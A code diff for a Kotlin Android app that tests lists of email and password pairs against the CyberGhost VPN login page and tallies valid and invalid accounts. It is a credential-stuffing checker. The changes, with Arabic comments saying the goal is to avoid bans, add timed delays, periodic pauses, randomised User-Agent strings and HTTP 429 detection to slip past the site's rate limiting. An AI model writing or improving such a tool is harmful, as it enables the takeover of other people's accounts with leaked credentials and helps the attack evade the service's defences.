@@ -78,9 +78,18 @@ class MainActivity : AppCompatActivity() {
             var valid = 0
             var invalid = 0
             var err = 0
-            for ((email, pwd) in combos) {
-                // إضافة تأخير بسيط عشان منضغطش على السيرفر
-                delay(1000) 
+            
+            for ((index, combo) in combos.withIndex()) {
+                val (email, pwd) = combo
+                
+                // تأخير 3 ثواني بين كل حساب لتجنب الحظر (429)
+                delay(3000) 
+                // استراحة 15 ثانية كل 10 حسابات
+                if (index > 0 && index % 10 == 0) {
+                    log.append("--- استراحة 15 ثانية لتجنب الحظر ---\n")
+                    delay(15000)
+                }
+
                 val (st, detail) = checkOne(email, pwd)
                 results.add(Triple(email, pwd, st))
                 when (st) {
@@ -105,12 +114,16 @@ class MainActivity : AppCompatActivity() {
             try {
                 cookieStore.clear()
 
+                // نغير الـ User-Agent كل مرة عشان نصعب الحظر
+                val ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${(120..125).random()}.0.0.0 Safari/537.36"
+
                 val getReq = Request.Builder()
                     .url("https://my.cyberghostvpn.com/en_US/login")
-                    .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
+                    .header("User-Agent", ua)
                     .build()
                 
                 client.newCall(getReq).execute().use { r1 ->
+                    if (r1.code == 429) return@withContext "error" to "rate_limit_429"
                     if (!r1.isSuccessful) return@withContext "error" to "get_${r1.code}"
                 }
 
@@ -125,7 +138,7 @@ class MainActivity : AppCompatActivity() {
 
                 val postReq = Request.Builder()
                     .url("https://my.cyberghostvpn.com/login")
-                    .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
+                    .header("User-Agent", ua)
                     .header("Origin", "https://my.cyberghostvpn.com")
                     .header("Referer", "https://my.cyberghostvpn.com/en_US/login")
                     .post(formBody)
@@ -144,7 +157,6 @@ class MainActivity : AppCompatActivity() {
                     }
                 }
             } catch (e: Exception) {
-                // هنا بنطبع نوع الخطأ بالظبط
                 "error" to (e.javaClass.simpleName + ": " + (e.message ?: "net"))
             }
         }
